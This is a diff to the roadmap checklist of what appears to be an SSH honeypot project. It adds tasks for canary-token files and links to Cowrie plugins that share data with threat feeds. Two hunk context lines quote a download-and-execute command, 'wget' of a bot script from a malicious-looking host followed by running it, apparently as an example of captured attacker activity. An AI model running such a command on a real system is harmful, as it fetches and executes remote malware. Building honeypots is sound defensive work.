@@ -156,6 +156,7 @@ wget http://malicious.com/bot.sh && chmod +x bot.sh && ./bot.sh
 - [ ] Realistic cron jobs in process list
 - [ ] Fake user home directories with files
 - [ ] Web honeypot on port 80/443 (nginx with fake admin panels)
+- [ ] Add files and more from <https://canarytokens.org/nest/>
 
 ### Multiple Honeypot Deployment
 - [ ] Deploy fleet across multiple Hetzner locations
@@ -174,6 +175,8 @@ wget http://malicious.com/bot.sh && chmod +x bot.sh && ./bot.sh
 - [ ] Export to STIX/TAXII format
 - [ ] Integration with MISP
 - [ ] Contribute to community threat feeds
+  - <https://github.com/cowrie/cowrie/blob/main/src/cowrie/output/greynoise.py>
+  - <https://github.com/cowrie/cowrie/blob/main/src/cowrie/output/dshield.py>
 
 ## Future: Security Hardening
 
